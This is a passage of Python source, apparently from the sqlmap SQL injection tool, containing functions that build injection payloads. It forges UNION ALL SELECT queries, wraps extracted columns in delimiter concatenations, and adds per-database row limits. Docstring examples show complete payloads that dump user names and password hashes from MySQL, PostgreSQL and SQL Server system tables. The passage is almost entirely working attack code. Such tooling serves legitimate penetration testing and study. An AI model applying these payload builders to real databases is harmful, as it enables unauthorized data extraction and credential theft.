re.search(r\"(?:MIN|MAX)\\(([^\\(\\)]+)\\)\", query, re.I)\n        fieldsNoSelect = query\n\n        _ = zeroDepthSearch(query, \" FROM \")\n        if not _:\n            fieldsSelectFrom = None\n\n        if re.search(r\"\\bWHERE\\b.+(MIN|MAX)\", query, re.I):\n            fieldsMinMaxstr = None\n\n        fieldsToCastStr = fieldsNoSelect\n\n        if fieldsSubstr:\n            fieldsToCastStr = query\n        elif fieldsMinMaxstr:\n            fieldsToCastStr = fieldsMinMaxstr.group(1)\n        elif fieldsExists:\n            if fieldsSelect:\n                fieldsToCastStr = fieldsSelect.group(1)\n        elif fieldsSelectTop:\n            fieldsToCastStr = fieldsSelectTop.group(2)\n        elif fieldsSelectRownum:\n            fieldsToCastStr = fieldsSelectRownum.group(1)\n        elif fieldsSelectDistinct:\n            if Backend.getDbms() in (DBMS.HSQLDB,):\n                fieldsToCastStr = fieldsNoSelect\n            else:\n                fieldsToCastStr = fieldsSelectDistinct.group(1)\n        elif fieldsSelectCase:\n            fieldsToCastStr = fieldsSelectCase.group(1)\n        elif fieldsSelectFrom:\n            fieldsToCastStr = query[:unArrayizeValue(_)] if _ else query\n            fieldsToCastStr = re.sub(r\"\\ASELECT%s\\s+\" % prefixRegex, \"\", fieldsToCastStr)\n        elif fieldsSelect:\n            fieldsToCastStr = fieldsSelect.group(1)\n\n        fieldsToCastStr = fieldsToCastStr or \"\"\n\n        # Function\n        if re.search(r\"\\A\\w+\\(.*\\)\", fieldsToCastStr, re.I) or (fieldsSelectCase and \"WHEN use\" not in query) or fieldsSubstr:\n            fieldsToCastList = [fieldsToCastStr]\n        else:\n            fieldsToCastList = splitFields(fieldsToCastStr)\n\n        return fieldsSelectFrom, fieldsSelect, fieldsNoSelect, fieldsSelectTop, fieldsSelectCase, fieldsToCastList, fieldsToCastStr, fieldsExists\n\n    def simpleConcatenate(self, first, second):\n        rootQuery = queries[Backend.getIdentifiedDbms()]\n        return rootQuery.concatenate.query % (first, second)\n\n    def preprocessField(self, table, field):\n        \"\"\"\n        Does a field preprocessing (if needed) based on its type (e.g. image to text)\n        Note: used primarily in dumping of custom tables\n        \"\"\"\n\n        retVal = field\n        if conf.db and table and conf.db in table:\n            table = table.split(conf.db)[-1].strip('.')\n        try:\n            columns = kb.data.cachedColumns[safeSQLIdentificatorNaming(conf.db)][safeSQLIdentificatorNaming(table, True)]\n            for name, type_ in columns.items():\n                if type_ and type_.upper() in DUMP_DATA_PREPROCESS.get(Backend.getDbms(), {}) and name == field:\n                    retVal = DUMP_DATA_PREPROCESS[Backend.getDbms()][type_.upper()] % name\n                    break\n        except KeyError:\n            pass\n        return retVal\n\n    def concatQuery(self, query, unpack=True):\n        \"\"\"\n        Take in input a query string and return its processed nulled,\n        casted and concatenated query string.\n\n        Examples:\n\n        MySQL input:  SELECT user, password FROM mysql.user\n        MySQL output: CONCAT('mMvPxc',IFNULL(CAST(user AS CHAR(10000)), ' '),'nXlgnR',IFNULL(CAST(password AS CHAR(10000)), ' '),'YnCzLl') FROM mysql.user\n\n        PostgreSQL input:  SELECT usename, passwd FROM pg_shadow\n        PostgreSQL output: 'HsYIBS'||COALESCE(CAST(usename AS CHARACTER(10000)), ' ')||'KTBfZp'||COALESCE(CAST(passwd AS CHARACTER(10000)), ' ')||'LkhmuP' FROM pg_shadow\n\n        Oracle input:  SELECT COLUMN_NAME, DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='USERS'\n        Oracle output: 'GdBRAo'||NVL(CAST(COLUMN_NAME AS VARCHAR(4000)), ' ')||'czEHOf'||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), ' ')||'JVlYgS' FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='USERS'\n\n        Microsoft SQL Server input:  SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins\n        Microsoft SQL Server output: 'QQMQJO'+ISNULL(CAST(name AS VARCHAR(8000)), ' ')+'kAtlqH'+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), ' ')+'lpEqoi' FROM master..sysxlogins\n\n        @param query: query string to be processed\n        @type query: C{str}\n\n        @return: query string nulled, casted and concatenated\n        @rtype: C{str}\n        \"\"\"\n\n        if unpack:\n            concatenatedQuery = \"\"\n            query = query.replace(\", \", ',')\n            fieldsSelectFrom, fieldsSelect, fieldsNoSelect, fieldsSelectTop, fieldsSelectCase, _, fieldsToCastStr, fieldsExists = self.getFields(query)\n            castedFields = self.nullCastConcatFields(fieldsToCastStr)\n            concatenatedQuery = query.replace(fieldsToCastStr, castedFields, 1)\n        else:\n            return query\n\n        if Backend.isDbms(DBMS.MYSQL):\n            if fieldsExists:\n                concatenatedQuery = concatenatedQuery.replace(\"SELECT \", \"CONCAT('%s',\" % kb.chars.start, 1)\n                concatenatedQuery += \",'%s')\" % kb.chars.stop\n            elif fieldsSelectCase:\n                concatenatedQuery = concatenatedQuery.replace(\"SELECT \", \"CONCAT('%s',\" % kb.chars.start, 1)\n                concatenatedQuery += \",'%s')\" % kb.chars.stop\n            elif fieldsSelectFrom:\n                _ = unArrayizeValue(zeroDepthSearch(concatenatedQuery, \" FROM \"))\n                concatenatedQuery = \"%s,'%s')%s\" % (concatenatedQuery[:_].replace(\"SELECT \", \"CONCAT('%s',\" % kb.chars.start, 1), kb.chars.stop, concatenatedQuery[_:])\n            elif fieldsSelect:\n                concatenatedQuery = concatenatedQuery.replace(\"SELECT \", \"CONCAT('%s',\" % kb.chars.start, 1)\n                concatenatedQuery += \",'%s')\" % kb.chars.stop\n            elif fieldsNoSelect:\n                concatenatedQuery = \"CONCAT('%s',%s,'%s')\" % (kb.chars.start, concatenatedQuery, kb.chars.stop)\n\n        elif Backend.getIdentifiedDbms() in (DBMS.PGSQL, DBMS.ORACLE, DBMS.SQLITE, DBMS.DB2, DBMS.FIREBIRD, DBMS.HSQLDB, DBMS.H2, DBMS.MONETDB, DBMS.DERBY, DBMS.VERTICA, DBMS.MCKOI, DBMS.PRESTO, DBMS.ALTIBASE, DBMS.MIMERSQL, DBMS.CRATEDB, DBMS.CUBRID, DBMS.CACHE, DBMS.EXTREMEDB, DBMS.FRONTBASE, DBMS.RAIMA, DBMS.VIRTUOSO):\n            if fieldsExists:\n                concatenatedQuery = concatenatedQuery.replace(\"SELECT \", \"'%s'||\" % kb.chars.start, 1)\n                concatenatedQuery += \"||'%s'\" % kb.chars.stop\n            elif fieldsSelectCase:\n                concatenatedQuery = concatenatedQuery.replace(\"SELECT \", \"'%s'||(SELECT \" % kb.chars.start, 1)\n                concatenatedQuery += \")||'%s'\" % kb.chars.stop\n            elif fieldsSelectFrom:\n                concatenatedQuery = concatenatedQuery.replace(\"SELECT \", \"'%s'||\" % kb.chars.start, 1)\n                _ = unArrayizeValue(zeroDepthSearch(concatenatedQuery, \" FROM \"))\n                concatenatedQuery = \"%s||'%s'%s\" % (concatenatedQuery[:_], kb.chars.stop, concatenatedQuery[_:])\n                concatenatedQuery = re.sub(r\"('%s'\\|\\|)(.+?)(%s)\" % (kb.chars.start, re.escape(castedFields)), r\"\\g<2>\\g<1>\\g<3>\", concatenatedQuery)\n            elif fieldsSelect:\n                concatenatedQuery = concatenatedQuery.replace(\"SELECT \", \"'%s'||\" % kb.chars.start, 1)\n                concatenatedQuery += \"||'%s'\" % kb.chars.stop\n            elif fieldsNoSelect:\n                concatenatedQuery = \"'%s'||%s||'%s'\" % (kb.chars.start, concatenatedQuery, kb.chars.stop)\n\n        elif Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):\n            if fieldsExists:\n                concatenatedQuery = concatenatedQuery.replace(\"SELECT \", \"'%s'+\" % kb.chars.start, 1)\n                concatenatedQuery += \"+'%s'\" % kb.chars.stop\n            elif fieldsSelectTop:\n                topNum = re.search(r\"\\ASELECT\\s+TOP(\\s+\\d+|\\s*\\([^)]+\\))\\s+\", concatenatedQuery, re.I).group(1)\n                concatenatedQuery = concatenatedQuery.replace(\"SELECT TOP%s \" % topNum, \"TOP%s '%s'+\" % (topNum, kb.chars.start), 1)\n                concatenatedQuery = concatenatedQuery.replace(\" FROM \", \"+'%s' FROM \" % kb.chars.stop, 1)\n            elif fieldsSelectCase:\n                concatenatedQuery = concatenatedQuery.replace(\"SELECT \", \"'%s'+\" % kb.chars.start, 1)\n                concatenatedQuery += \"+'%s'\" % kb.chars.stop\n            elif fieldsSelectFrom:\n                concatenatedQuery = concatenatedQuery.replace(\"SELECT \", \"'%s'+\" % kb.chars.start, 1)\n                _ = unArrayizeValue(zeroDepthSearch(concatenatedQuery, \" FROM \"))\n                concatenatedQuery = \"%s+'%s'%s\" % (concatenatedQuery[:_], kb.chars.stop, concatenatedQuery[_:])\n            elif fieldsSelect:\n                concatenatedQuery = concatenatedQuery.replace(\"SELECT \", \"'%s'+\" % kb.chars.start, 1)\n                concatenatedQuery += \"+'%s'\" % kb.chars.stop\n            elif fieldsNoSelect:\n                concatenatedQuery = \"'%s'+%s+'%s'\" % (kb.chars.start, concatenatedQuery, kb.chars.stop)\n\n        elif Backend.isDbms(DBMS.ACCESS):\n            if fieldsExists:\n                concatenatedQuery = concatenatedQuery.replace(\"SELECT \", \"'%s'&\" % kb.chars.start, 1)\n                concatenatedQuery += \"&'%s'\" % kb.chars.stop\n            elif fieldsSelectCase:\n                concatenatedQuery = concatenatedQuery.replace(\"SELECT \", \"'%s'&(SELECT \" % kb.chars.start, 1)\n                concatenatedQuery += \")&'%s'\" % kb.chars.stop\n            elif fieldsSelectFrom:\n                concatenatedQuery = concatenatedQuery.replace(\"SELECT \", \"'%s'&\" % kb.chars.start, 1)\n                _ = unArrayizeValue(zeroDepthSearch(concatenatedQuery, \" FROM \"))\n                concatenatedQuery = \"%s&'%s'%s\" % (concatenatedQuery[:_], kb.chars.stop, concatenatedQuery[_:])\n            elif fieldsSelect:\n                concatenatedQuery = concatenatedQuery.replace(\"SELECT \", \"'%s'&\" % kb.chars.start, 1)\n                concatenatedQuery += \"&'%s'\" % kb.chars.stop\n            elif fieldsNoSelect:\n                concatenatedQuery = \"'%s'&%s&'%s'\" % (kb.chars.start, concatenatedQuery, kb.chars.stop)\n\n        else:\n            warnMsg = \"applying generic concatenation (CONCAT)\"\n            singleTimeWarnMessage(warnMsg)\n\n            if FROM_DUMMY_TABLE.get(Backend.getIdentifiedDbms()):\n                _ = re.sub(r\"(?i)%s\\Z\" % re.escape(FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()]), \"\", concatenatedQuery)\n                if _ != concatenatedQuery:\n                    concatenatedQuery = _\n                    fieldsSelectFrom = None\n\n            if fieldsExists:\n                concatenatedQuery = concatenatedQuery.replace(\"SELECT \", \"CONCAT(CONCAT('%s',\" % kb.chars.start, 1)\n                concatenatedQuery += \"),'%s')\" % kb.chars.stop\n            elif fieldsSelectCase:\n                concatenatedQuery = concatenatedQuery.replace(\"SELECT \", \"CONCAT(CONCAT('%s',\" % kb.chars.start, 1)\n                concatenatedQuery += \"),'%s')\" % kb.chars.stop\n            elif fieldsSelectFrom or fieldsSelect:\n                fromTable = \"\"\n\n                _ = unArrayizeValue(zeroDepthSearch(concatenatedQuery, \" FROM \"))\n                if _:\n                    concatenatedQuery, fromTable = concatenatedQuery[:_], concatenatedQuery[_:]\n\n                concatenatedQuery = re.sub(r\"(?i)\\ASELECT \", \"\", concatenatedQuery)\n                replacement = \"'%s',%s,'%s'\" % (kb.chars.start, concatenatedQuery, kb.chars.stop)\n                chars = [_ for _ in replacement]\n\n                count = 0\n                for index in zeroDepthSearch(replacement, ',')[1:]:\n                    chars[index] = \"),\"\n                    count += 1\n\n                replacement = \"CONCAT(%s%s)\" % (\"CONCAT(\" * count, \"\".join(chars))\n                concatenatedQuery = \"%s%s\" % (replacement, fromTable)\n            elif fieldsSelect:\n                concatenatedQuery = concatenatedQuery.replace(\"SELECT \", \"CONCAT(CONCAT('%s',\" % kb.chars.start, 1)\n                concatenatedQuery += \"),'%s')\" % kb.chars.stop\n            elif fieldsNoSelect:\n                concatenatedQuery = \"CONCAT(CONCAT('%s',%s),'%s')\" % (kb.chars.start, concatenatedQuery, kb.chars.stop)\n\n        return concatenatedQuery\n\n    def forgeUnionQuery(self, query, position, count, comment, prefix, suffix, char, where, multipleUnions=None, limited=False, fromTable=None):\n        \"\"\"\n        Take in input an query (pseudo query) string and return its\n        processed UNION ALL SELECT query.\n\n        Examples:\n\n        MySQL input:  CONCAT(CHAR(120,121,75,102,103,89),IFNULL(CAST(user AS CHAR(10000)), CHAR(32)),CHAR(106,98,66,73,109,81),IFNULL(CAST(password AS CHAR(10000)), CHAR(32)),CHAR(105,73,99,89,69,74)) FROM mysql.user\n        MySQL output:  UNION ALL SELECT NULL, CONCAT(CHAR(120,121,75,102,103,89),IFNULL(CAST(user AS CHAR(10000)), CHAR(32)),CHAR(106,98,66,73,109,81),IFNULL(CAST(password AS CHAR(10000)), CHAR(32)),CHAR(105,73,99,89,69,74)), NULL FROM mysql.user-- AND 7488=7488\n\n        PostgreSQL input:  (CHR(116)||CHR(111)||CHR(81)||CHR(80)||CHR(103)||CHR(70))||COALESCE(CAST(usename AS CHARACTER(10000)), (CHR(32)))||(CHR(106)||CHR(78)||CHR(121)||CHR(111)||CHR(84)||CHR(85))||COALESCE(CAST(passwd AS CHARACTER(10000)), (CHR(32)))||(CHR(108)||CHR(85)||CHR(122)||CHR(85)||CHR(108)||CHR(118)) FROM pg_shadow\n        PostgreSQL output:  UNION ALL SELECT NULL, (CHR(116)||CHR(111)||CHR(81)||CHR(80)||CHR(103)||CHR(70))||COALESCE(CAST(usename AS CHARACTER(10000)), (CHR(32)))||(CHR(106)||CHR(78)||CHR(121)||CHR(111)||CHR(84)||CHR(85))||COALESCE(CAST(passwd AS CHARACTER(10000)), (CHR(32)))||(CHR(108)||CHR(85)||CHR(122)||CHR(85)||CHR(108)||CHR(118)), NULL FROM pg_shadow-- AND 7133=713\n\n        Oracle input:  (CHR(109)||CHR(89)||CHR(75)||CHR(109)||CHR(85)||CHR(68))||NVL(CAST(COLUMN_NAME AS VARCHAR(4000)), (CHR(32)))||(CHR(108)||CHR(110)||CHR(89)||CHR(69)||CHR(122)||CHR(90))||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), (CHR(32)))||(CHR(89)||CHR(80)||CHR(98)||CHR(77)||CHR(80)||CHR(121)) FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME=(CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(83))\n        Oracle output:  UNION ALL SELECT NULL, (CHR(109)||CHR(89)||CHR(75)||CHR(109)||CHR(85)||CHR(68))||NVL(CAST(COLUMN_NAME AS VARCHAR(4000)), (CHR(32)))||(CHR(108)||CHR(110)||CHR(89)||CHR(69)||CHR(122)||CHR(90))||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), (CHR(32)))||(CHR(89)||CHR(80)||CHR(98)||CHR(77)||CHR(80)||CHR(121)), NULL FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME=(CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(83))-- AND 6738=6738\n\n        Microsoft SQL Server input:  (CHAR(74)+CHAR(86)+CHAR(106)+CHAR(116)+CHAR(116)+CHAR(108))+ISNULL(CAST(name AS VARCHAR(8000)), (CHAR(32)))+(CHAR(89)+CHAR(87)+CHAR(116)+CHAR(100)+CHAR(106)+CHAR(74))+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), (CHAR(32)))+(CHAR(71)+CHAR(74)+CHAR(68)+CHAR(66)+CHAR(85)+CHAR(106)) FROM master..sysxlogins\n        Microsoft SQL Server output:  UNION ALL SELECT NULL, (CHAR(74)+CHAR(86)+CHAR(106)+CHAR(116)+CHAR(116)+CHAR(108))+ISNULL(CAST(name AS VARCHAR(8000)), (CHAR(32)))+(CHAR(89)+CHAR(87)+CHAR(116)+CHAR(100)+CHAR(106)+CHAR(74))+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), (CHAR(32)))+(CHAR(71)+CHAR(74)+CHAR(68)+CHAR(66)+CHAR(85)+CHAR(106)), NULL FROM master..sysxlogins-- AND 3254=3254\n\n        @param query: it is a processed query string unescaped to be\n        forged within an UNION ALL SELECT statement\n        @type query: C{str}\n\n        @param position: it is the NULL position where it is possible\n        to inject the query\n        @type position: C{int}\n\n        @return: UNION ALL SELECT query string forged\n        @rtype: C{str}\n        \"\"\"\n\n        if conf.uFrom:\n            fromTable = \" FROM %s\" % conf.uFrom\n        elif not fromTable:\n            if kb.tableFrom:\n                fromTable = \" FROM %s\" % kb.tableFrom\n            else:\n                fromTable = FROM_DUMMY_TABLE.get(Backend.getIdentifiedDbms(), \"\")\n\n        if query.startswith(\"SELECT \"):\n            query = query[len(\"SELECT \"):]\n\n        unionQuery = self.prefixQuery(\"UNION ALL SELECT \", prefix=prefix)\n\n        if limited:\n            unionQuery += ','.join(char if _ != position else '(SELECT %s)' % query for _ in xrange(0, count))\n            unionQuery += fromTable\n            unionQuery = self.suffixQuery(unionQuery, comment, suffix)\n\n            return unionQuery\n        else:\n            _ = zeroDepthSearch(query, \" FROM \")\n            if _:\n                fromTable = query[_[0]:]\n\n            if fromTable and query.endswith(fromTable):\n                query = query[:-len(fromTable)]\n\n        topNumRegex = re.search(r\"\\ATOP\\s+([\\d]+)\\s+\", query, re.I)\n        if topNumRegex:\n            topNum = topNumRegex.group(1)\n            query = query[len(\"TOP %s \" % topNum):]\n            unionQuery += \"TOP %s \" % topNum\n\n        intoRegExp = re.search(r\"(\\s+INTO (DUMP|OUT)FILE\\s+'(.+?)')\", query, re.I)\n\n        if intoRegExp:\n            intoRegExp = intoRegExp.group(1)\n            query = query[:query.index(intoRegExp)]\n\n            position = 0\n            char = NULL\n\n        for element in xrange(0, count):\n            if element > 0:\n                unionQuery += ','\n\n            if conf.uValues and conf.uValues.count(',') + 1 == count:\n                unionQuery += conf.uValues.split(',')[element]\n            elif element == position:\n                unionQuery += query\n            else:\n                unionQuery += char\n\n        if conf.uValues:\n            unionQuery = unionQuery.replace(CUSTOM_INJECTION_MARK_CHAR, query)\n\n        if fromTable and not unionQuery.endswith(fromTable):\n            unionQuery += fromTable\n\n        if intoRegExp:\n            unionQuery += intoRegExp\n\n        if multipleUnions:\n            unionQuery += \" UNION ALL SELECT \"\n\n            for element in xrange(count):\n                if element > 0:\n                    unionQuery += ','\n\n                if element == position:\n                    unionQuery += multipleUnions\n                else:\n                    unionQuery += char\n\n            if fromTable:\n                unionQuery += fromTable\n\n        unionQuery = self.suffixQuery(unionQuery, comment, suffix)\n\n        return unionQuery\n\n    def limitCondition(self, expression, dump=False):\n        startLimit = 0\n        stopLimit = None\n        limitCond = True\n\n        topLimit = re.search(r\"TOP\\s+([\\d]+)\\s+\", expression, re.I)\n\n        limitRegExp = re.search(queries[Backend.getIdentifiedDbms()].limitregexp.query, expression, re.I)\n\n        if hasattr(queries[Backend.getIdentifiedDbms()].limitregexp, \"query2\"):\n            limitRegExp2 = re.search(queries[Backend.getIdentifiedDbms()].limitregexp.query2, expression, re.I)\n        else:\n            limitRegExp2 = None\n\n        if (limitRegExp or limitRegExp2) or (Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE) and topLimit):\n            if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL, DBMS.SQLITE, DBMS.H2):\n                limitGroupStart = queries[Backend.getIdentifiedDbms()].limitgroupstart.query\n                limitGroupStop = queries[Backend.getIdentifiedDbms()].limitgroupstop.query\n\n                if limitGroupStart.isdigit():\n                    if limitRegExp:\n                        startLimit = int(limitRegExp.group(int(limitGroupStart)))\n                        stopLimit = limitRegExp.group(int(limitGroupStop))\n                    elif limitRegExp2:\n                        startLimit = 0\n                        stopLimit = limitRegExp2.group(int(limitGroupStart))\n                limitCond = int(stopLimit) > 1\n\n            elif Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):\n                if limitRegExp:\n                    limitGroupStart = queries[Backend.getIdentifiedDbms()].limitgroupstart.query\n                    limitGroupStop = queries[Backend.getIdentifiedDbms()].limitgroupstop.query\n\n                    if limitGroupStart.isdigit():\n                        startLimit = int(limitRegExp.group(int(limitGroupStart)))\n\n                    stopLimit = limitRegExp.group(int(limitGroupStop))\n                    limitCond = int(stopLimit) > 1\n                elif topLimit:\n                    startLimit = 0\n                    stopLimit = int(topLimit.group(1))\n                    limitCond = int(stopLimit) > 1\n\n            elif Backend.isDbms(DBMS.ORACLE):\n                limitCond = False\n\n        # We assume that only queries NOT containing a \"LIMIT #, 1\"\n        # (or equivalent depending on the back-end DBMS) can return\n        # multiple entries\n        if limitCond:\n            if (limitRegExp or limitRegExp2) and stopLimit is not None:\n                stopLimit = int(stopLimit)\n\n                # From now on we need only the expression until the \" LIMIT \"\n                # (or equivalent, depending on the back-end DBMS) word\n                if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL, DBMS.SQLITE):\n                    stopLimit += startLimit\n                    if expression.find(queries[Backend.getIdentifiedDbms()].limitstring.query) > 0:\n                        _ = expression.index(queries[Backend.getIdentifiedDbms()].limitstring.query)\n                    else:\n                        _ = re.search(r\"\\bLIMIT\\b\", expression, re.I).start()\n                    expression = expression[:_]\n\n                elif Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):\n                    stopLimit += startLimit\n            elif dump:\n                if conf.limitStart:\n                    startLimit = conf.limitStart - 1\n                if conf.limitStop:\n                    stopLimit = conf.limitStop\n\n        return expression, limitCond, topLimit, startLimit, stopLimit\n\n    def limitQuery(self, num, query, field=None, uniqueField=None):\n        \"\"\"\n        Take in input a query string and return its limited query string.\n\n        Example:\n\n        Input:  SELECT user FROM mysql.users\n        Output: SELECT user FROM mysql.users LIMIT <num>, 1\n\n        @param num: limit number\n        @type num: C{int}\n\n        @param query: query to be processed\n        @type query: C{str}\n\n        @param field: field within the query\n        @type field: C{list}\n\n        @return: limited query string\n        @rtype: C{str}\n        \"\"\"\n\n        if \" FROM \" not in query:\n            return query\n\n        limitedQuery = query\n        limitStr = queries[Backend.getIdentifiedDbms()].limit.query\n        fromIndex = limitedQuery.index(\" FROM \")\n        untilFrom = limitedQuery[:fromIndex]\n        fromFrom = limitedQuery[fromIndex + 1:]\n        orderBy = None\n\n        if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL, DBMS.SQLITE, DBMS.VERTICA, DBMS.PRESTO, DBMS.MIMERSQL, DBMS.CUBRID, DBMS.EXTREMEDB, DBMS.DERBY):\n            limitStr = queries[Backend.getIdentifiedDbms()].limit.query % (num, 1)\n            limitedQuery += \" %s\" % limitStr\n\n        elif Backend.getIdentifiedDbms() in (DBMS.H2, DBMS.CRATEDB, DBMS.CLICKHOUSE):\n            limitStr = queries[Backend.getIdentifiedDbms()].limit.query % (1, num)\n            limitedQuery += \" %s\" % limitStr\n\n        elif Backend.getIdentifiedDbms() in (DBMS.ALTIBASE,):\n            limitStr = queries[Backend.getIdentifiedDbms()].limit.query % (num + 1, 1)\n            limitedQuery += \" %s\" % limitStr\n\n        elif Backend.getIdentifiedDbms() in (DBMS.FRONTBASE, DBMS.VIRTUOSO):\n            limitStr = queries[Backend.getIdentifiedDbms()].limit.query % (num, 1)\n            if query.startswith(\"SELECT \"):\n                limitedQuery = query.replace(\"SELECT \", \"SELECT %s \" % limitStr, 1)\n\n        elif Backend.getIdentifiedDbms() in (DBMS.MONETDB,):\n            if query.startswith(\"SELECT \") and field is not None and field in query:\n                original = query.split(\"SELECT \", 1)[1].split(\" FROM\", 1)[0]\n                for part in original.split(','):\n                    if re.search(r\"\\b%s\\b\" % re.escape(field), part):\n                        _ = re.sub(r\"SELECT.+?FROM\", \"SELECT %s AS z,row_number() over() AS y FROM\" % part, query, 1)\n                        replacement = \"SELECT x.z FROM (%s)x WHERE x.y-1=%d\" % (_, num)\n                        limitedQuery = replacement\n                        break\n\n        elif Backend.isDbms(DBMS.HSQLDB):\n            match = re.search(r\"ORDER BY [^ ]+\", limitedQuery)\n            if match:\n                limitedQuery = re.sub(r\"\\s*%s\\s*\" % re.escape(match.group(0)), \" \", limitedQuery).strip()\n                limitedQuery += \" %s\" % match.group(0)\n\n            if query.startswith(\"SELECT \"):\n                limitStr = queries[Backend.getIdentifiedDbms()].limit.query % (num, 1)\n                limitedQuery = limitedQuery.replace(\"SELECT \", \"SELECT %s \" % limitStr, 1)\n            else:\n                limitStr = queries[Backend.getIdentifiedDbms()].limit.query2 % (1, num)\n                limitedQuery += \" %s\" % limitStr\n\n            if not match:\n                match = re.search(r\"%s\\s+(\\w+)\" % re.escape(limitStr), limitedQuery)\n                if match:\n                    orderBy = \" ORDER BY %s\" % match.group(1)\n\n        elif Backend.isDbms(DBMS.CACHE):\n            match = re.search(r\"ORDER BY ([^ ]+)\\Z\", limitedQuery)\n            if match:\n                limitedQuery = re.sub(r\"\\s*%s\\s*\" % re.escape(match.group(0)), \" \", limitedQuery).strip()\n                orderBy = \" %s\" % match.group(0)\n                field = match.group(1)\n\n            limitedQuery = queries[Backend.getIdentifiedDbms()].limit.query % (1, field, limitedQuery, num)\n\n        elif Backend.isDbms(DBMS.FIREBIRD):\n            limitStr = queries[Backend.getIdentifiedDbms()].limit.query % (num + 1, num + 1)\n            limitedQuery += \" %s\" % limitStr\n\n        elif Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2):\n            if \" ORDER BY \" not in limitedQuery:\n                limitStr = limitStr.replace(\") WHERE LIMIT\", \" ORDER BY 1 ASC) WHERE LIMIT\")\n            elif \" ORDER BY \" in limitedQuery and \"SELECT \" in limitedQuery:\n                limitedQuery = limitedQuery[:limitedQuery.index(\" ORDER BY \")]\n\n            if query.startswith(\"SELECT \"):\n                delimiter = queries[Backend.getIdentifiedDbms()].delimiter.query\n                limitedQuery = \"%s FROM (%s,%s\" % (untilFrom, untilFrom.replace(delimiter, ','), limitStr)\n            else:\n                limitedQuery = \"%s FROM (SELECT %s,%s\" % (untilFrom, ','.join(f for f in field), limitStr)\n\n            limitedQuery = safeStringFormat(limitedQuery, (fromFrom,))\n            limitedQuery += \"=%d\" % (num + 1)\n\n        elif Backend.isDbms(DBMS.MSSQL):\n            forgeNotIn = True\n\n            if \" ORDER BY \" in limitedQuery:\n                orderBy = limitedQuery[limitedQuery.index(\" ORDER BY \"):]\n                limitedQuery = limitedQuery[:limitedQuery.index(\" ORDER BY \")]\n\n            notDistincts = re.findall(r\"DISTINCT[\\(\\s+](.+?)\\)*\\s+\", limitedQuery, re.I)\n\n            for notDistinct in notDistincts:\n                limitedQuery = limitedQuery.replace(\"DISTINCT(%s)\" % notDistinct, notDistinct)\n                limitedQuery = limitedQuery.replace(\"DISTINCT %s\" % notDistinct, notDistinct)\n\n            if limitedQuery.startswith(\"SELECT TOP \") or limitedQuery.startswith(\"TOP \"):\n                topNums = re.search(queries[Backend.getIdentifiedDbms()].limitregexp.query, limitedQuery, re.I)\n\n                if topNums:\n                    topNums = topNums.groups()\n                    quantityTopNums = topNums[0]\n                    limitedQuery = limitedQuery.replace(\"TOP %s\" % quantityTopNums, \"TOP 1\", 1)\n                    startTopNums = topNums[1]\n                    limitedQuery = limitedQuery.replace(\" (SELECT TOP %s\" % startTopNums, \" (SELECT TOP %d\" % num)\n                    forgeNotIn = False\n                else:\n                    limitedQuery = re.sub(r\"\\bTOP\\s+\\d+\\s*\", \"\", limitedQuery, flags=re.I)\n\n            if forgeNotIn:\n                limitedQuery = limitedQuery.replace(\"SELECT \", (limitStr % 1), 1)\n\n                if \" ORDER BY \" not in fromFrom:\n                    # Reference: https://web.archive.org/web/20150218053955/http://vorg.ca/626-the-MS-SQL-equivalent-to-MySQLs-limit-command\n                    if \" WHERE \" in limitedQuery:\n                        limitedQuery = \"%s AND %s \" % (limitedQuery, self.nullAndCastField(uniqueField or field))\n                    else:\n                        limitedQuery = \"%s WHERE %s \" % (limitedQuery, self.nullAndCastField(uniqueField or field))\n\n                    limitedQuery += \"NOT IN (%s\" % (limitStr % num)\n                    limitedQuery += \"%s %s ORDER BY %s) ORDER BY %s\" % (self.nullAndCastField(uniqueField or field), fromFrom, uniqueField or '1', uniqueField or '1')\n                else:\n                    match = re.search(r\" ORDER BY (\\w+)\\Z\", query)\n                    field = match.group(1) if match else field\n\n                    if \" WHERE \" in limitedQuery:\n                        limitedQuery = \"%s AND %s \" % (limitedQuery, field)\n                    else:\n                        limitedQuery = \"%s WHERE %s \" % (limitedQuery, field)\n\n                    limitedQuery += \"NOT IN (%s\" % (limitStr % num)\n                    limitedQuery += \"%s %s)\" % (field, fromFrom)\n\n        if orderBy:\n            limitedQuery += orderBy\n\n        return limitedQuery\n\n    def forgeQueryOutputLength(self, expression):\n        lengthQuery = queries[Backend.getIdentifiedDbms()].length.query\n        select = re.search(r\"\\ASELECT\\s+\", expression, re.I)\n        selectFrom = re.search(r\"\\ASELECT\\s+(.+)\\s+FROM\\s+(.+)\", expression, re.I)\n        selectTopExpr = re.search(r\"\\ASELECT\\s+TOP\\s+[\\d]+\\s+(.+?)\\s+FROM\", expression, re.I)\n        selectMinMaxExpr = re.search(r\"\\ASELECT\\s+(MIN|MAX)\\(.+?\\)\\s+FROM\", expression, re.I)\n\n        _, _, _, _, _, _, fieldsStr, _ = self.getFields(expression)\n\n        if Backend.getIdentifiedDbms() in (DBMS.MCKOI,) and selectFrom:\n            lengthExpr = \"SELECT %s FROM %s\" % (lengthQuery % selectFrom.group(1), selectFrom.group(2))\n        elif selectTopExpr or selectMinMaxExpr:\n            lengthExpr = lengthQuery % (\"(%s)\" % expression)\n        elif 